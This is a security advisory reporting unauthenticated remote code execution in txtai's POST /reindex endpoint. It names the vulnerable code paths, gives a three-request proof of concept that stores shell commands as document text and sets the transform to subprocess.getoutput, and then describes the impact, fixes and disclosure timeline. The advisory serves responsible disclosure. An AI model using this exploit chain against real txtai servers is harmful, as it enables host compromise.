
# unauthenticated RCE via arbitrary transform import in POST /reindex

https://github.com/neuml/txtai

version: 9.10.0

## Summary

POST /reindex accepts a caller-supplied config dict whose transform value is passed to Resolver, which does __import__ on an arbitrary dotted Python path (no allowlist) and then calls the resolved object on the indexed document text. Setting transform to subprocess.getoutput and storing a document whose text is a shell command yields RCE. The API only enforces auth when a TOKEN env var is set; the default has no TOKEN, so endpoints are unauthenticated.

## Where

txtai/api/routers/embeddings.py:189 (reindex takes config: dict = Body(...))
txtai/app/base.py:556 (reindex; requires writable:true)
txtai/vectors/dense/external.py resolve() -> Resolver()(transform)
txtai/util/resolver.py (__import__(module) + getattr chain, no allowlist)
txtai/api/application.py (Authorization dependency only added when TOKEN is set)

## Proof of concept (all unauthenticated; config.yml has writable:true, embeddings.content:true; no TOKEN)

1. POST /add  [{"id":"1","text":"touch /tmp/TXTAI_PWNED_$(id -u) ; echo pwned"}]
2. GET  /index
3. POST /reindex  {"config":{"transform":"subprocess.getoutput","content":true}}
-> /tmp/TXTAI_PWNED_1000 created ($(id -u) expanded, proving shell execution); a second payload "id > /tmp/TXTAI_ID_OUTPUT.txt" captured full id output. HTTP 500 is returned after the command runs (string can't be cast to a float vector).

## Impact

Default-config unauthenticated RCE as the server user on a writable txtai API -> host compromise. The Resolver __import__ from request config is a code-injection primitive even for authenticated low-priv callers.

## Suggested fix

Do not resolve arbitrary dotted paths from request config; restrict transform/Resolver to an allowlist of vetted vectorizer classes (or disable string-path resolution on the API); require auth by default (refuse to start a writable API with no TOKEN); validate /reindex config cannot introduce callables.

## Disclosure

 - 9 June 2026 - reported via email
 - 10 June 2026 - maintainer accepted report
 - 10 June 2026 - https://github.com/neuml/txtai/issues/1111
 - 10 June 2026 - issue closed
 - 26 June 2026 - duplicates from other researchers reported publicly, violating security policy
